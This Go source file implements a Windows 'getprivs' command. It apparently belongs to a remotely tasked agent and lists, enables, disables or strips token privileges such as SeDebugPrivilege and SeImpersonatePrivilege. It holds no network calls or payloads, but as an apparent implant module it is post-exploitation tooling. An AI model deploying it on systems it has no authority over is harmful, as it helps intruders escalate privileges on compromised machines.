//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

type GetPrivsCommand struct{}

func (c *GetPrivsCommand) Name() string {
	return "getprivs"
}

func (c *GetPrivsCommand) Description() string {
	return "List, enable, disable, or strip token privileges"
}

type getPrivsParams struct {
	Action    string `json:"action"`
	Privilege string `json:"privilege"`
}

func (c *GetPrivsCommand) Execute(task structs.Task) structs.CommandResult {
	var params getPrivsParams
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
			// Legacy: no params = list
			params.Action = "list"
		}
	}
	if params.Action == "" {
		params.Action = "list"
	}

	switch params.Action {
	case "list":
		return listPrivileges()
	case "enable":
		if params.Privilege == "" {
			return structs.CommandResult{
				Output:    "Error: 'privilege' parameter required for enable action",
				Status:    "error",
				Completed: true,
			}
		}
		return adjustPrivilege(params.Privilege, true)
	case "disable":
		if params.Privilege == "" {
			return structs.CommandResult{
				Output:    "Error: 'privilege' parameter required for disable action",
				Status:    "error",
				Completed: true,
			}
		}
		return adjustPrivilege(params.Privilege, false)
	case "strip":
		return stripPrivileges()
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s (use 'list', 'enable', 'disable', or 'strip')", params.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func listPrivileges() structs.CommandResult {
	token, tokenSource, err := getCurrentToken()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to get current token: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer token.Close()

	identity, _ := GetTokenUserInfo(token)
	privs, err := getTokenPrivileges(token)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to enumerate privileges: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	integrity, err := getTokenIntegrityLevel(token)
	if err != nil {
		integrity = "Unknown"
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Token: %s (%s)\n", identity, tokenSource))
	sb.WriteString(fmt.Sprintf("Integrity: %s\n", integrity))
	sb.WriteString(fmt.Sprintf("Privileges: %d\n\n", len(privs)))

	enabledCount := 0
	for _, p := range privs {
		if p.status == "Enabled" || p.status == "Enabled (Default)" {
			enabledCount++
		}
	}
	sb.WriteString(fmt.Sprintf("Enabled: %d / %d\n\n", enabledCount, len(privs)))

	sb.WriteString(fmt.Sprintf("%-45s %-18s %s\n", "PRIVILEGE", "STATUS", "DESCRIPTION"))
	sb.WriteString(strings.Repeat("-", 110) + "\n")

	for _, p := range privs {
		desc := privilegeDescription(p.name)
		sb.WriteString(fmt.Sprintf("%-45s %-18s %s\n", p.name, p.status, desc))
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// getTokenForAdjust opens the current token with ADJUST_PRIVILEGES access.
func getTokenForAdjust() (windows.Token, error) {
	// Try thread token first (impersonation)
	var threadToken windows.Token
	err := windows.OpenThreadToken(windows.CurrentThread(),
		windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, true, &threadToken)
	if err == nil {
		return threadToken, nil
	}

	// Fall back to process token
	processHandle, err := windows.GetCurrentProcess()
	if err != nil {
		return 0, fmt.Errorf("GetCurrentProcess: %v", err)
	}

	var processToken windows.Token
	err = windows.OpenProcessToken(processHandle,
		windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &processToken)
	if err != nil {
		return 0, fmt.Errorf("OpenProcessToken: %v", err)
	}
	return processToken, nil
}

func adjustPrivilege(privName string, enable bool) structs.CommandResult {
	token, err := getTokenForAdjust()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to get token: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer token.Close()

	var luid windows.LUID
	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(privName), &luid)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Privilege '%s' not found: %v", privName, err),
			Status:    "error",
			Completed: true,
		}
	}

	attrs := uint32(0)
	if enable {
		attrs = windows.SE_PRIVILEGE_ENABLED
	}

	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{Luid: luid, Attributes: attrs},
		},
	}

	err = windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("AdjustTokenPrivileges failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	action := "enabled"
	if !enable {
		action = "disabled"
	}

	desc := privilegeDescription(privName)
	output := fmt.Sprintf("Successfully %s %s", action, privName)
	if desc != "" {
		output += fmt.Sprintf(" (%s)", desc)
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
}

func stripPrivileges() structs.CommandResult {
	token, err := getTokenForAdjust()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to get token: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer token.Close()

	// Get current privileges
	privs, err := getTokenPrivileges(token)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to enumerate privileges: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Keep only SeChangeNotifyPrivilege enabled (benign, always present)
	// Disable everything else
	kept := "SeChangeNotifyPrivilege"
	disabled := 0
	var errors []string

	for _, p := range privs {
		if p.name == kept {
			continue
		}
		if p.status == "Disabled" {
			continue
		}

		var luid windows.LUID
		err := windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(p.name), &luid)
		if err != nil {
			errors = append(errors, fmt.Sprintf("%s: lookup failed", p.name))
			continue
		}

		tp := windows.Tokenprivileges{
			PrivilegeCount: 1,
			Privileges: [1]windows.LUIDAndAttributes{
				{Luid: luid, Attributes: 0},
			},
		}

		err = windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil)
		if err != nil {
			errors = append(errors, fmt.Sprintf("%s: %v", p.name, err))
			continue
		}
		disabled++
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Stripped %d privileges (kept %s)\n", disabled, kept))
	if len(errors) > 0 {
		sb.WriteString(fmt.Sprintf("Errors (%d):\n", len(errors)))
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  - %s\n", e))
		}
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// privilegeDescription returns a human-readable description for known privileges
func privilegeDescription(name string) string {
	descriptions := map[string]string{
		"SeAssignPrimaryTokenPrivilege":             "Replace a process-level token",
		"SeAuditPrivilege":                          "Generate security audits",
		"SeBackupPrivilege":                         "Back up files and directories",
		"SeChangeNotifyPrivilege":                   "Bypass traverse checking",
		"SeCreateGlobalPrivilege":                   "Create global objects",
		"SeCreatePagefilePrivilege":                 "Create a pagefile",
		"SeCreatePermanentPrivilege":                "Create permanent shared objects",
		"SeCreateSymbolicLinkPrivilege":             "Create symbolic links",
		"SeCreateTokenPrivilege":                    "Create a token object",
		"SeDebugPrivilege":                          "Debug programs",
		"SeDelegateSessionUserImpersonatePrivilege": "Impersonate other users",
		"SeEnableDelegationPrivilege":               "Enable delegation",
		"SeImpersonatePrivilege":                    "Impersonate a client after authentication",
		"SeIncreaseBasePriorityPrivilege":           "Increase scheduling priority",
		"SeIncreaseQuotaPrivilege":                  "Adjust memory quotas for a process",
		"SeIncreaseWorkingSetPrivilege":             "Increase a process working set",
		"SeLoadDriverPrivilege":                     "Load and unload device drivers",
		"SeLockMemoryPrivilege":                     "Lock pages in memory",
		"SeMachineAccountPrivilege":                 "Add workstations to domain",
		"SeManageVolumePrivilege":                   "Perform volume maintenance tasks",
		"SeProfileSingleProcessPrivilege":           "Profile single process",
		"SeRelabelPrivilege":                        "Modify an object label",
		"SeRemoteShutdownPrivilege":                 "Force shutdown from a remote system",
		"SeRestorePrivilege":                        "Restore files and directories",
		"SeSecurityPrivilege":                       "Manage auditing and security log",
		"SeShutdownPrivilege":                       "Shut down the system",
		"SeSyncAgentPrivilege":                      "Synchronize directory service data",
		"SeSystemEnvironmentPrivilege":              "Modify firmware environment values",
		"SeSystemProfilePrivilege":                  "Profile system performance",
		"SeSystemtimePrivilege":                     "Change the system time",
		"SeTakeOwnershipPrivilege":                  "Take ownership of files or other objects",
		"SeTcbPrivilege":                            "Act as part of the operating system",
		"SeTimeZonePrivilege":                       "Change the time zone",
		"SeTrustedCredManAccessPrivilege":           "Access Credential Manager as a trusted caller",
		"SeUndockPrivilege":                         "Remove computer from docking station",
	}

	if desc, ok := descriptions[name]; ok {
		return desc
	}
	return ""
}
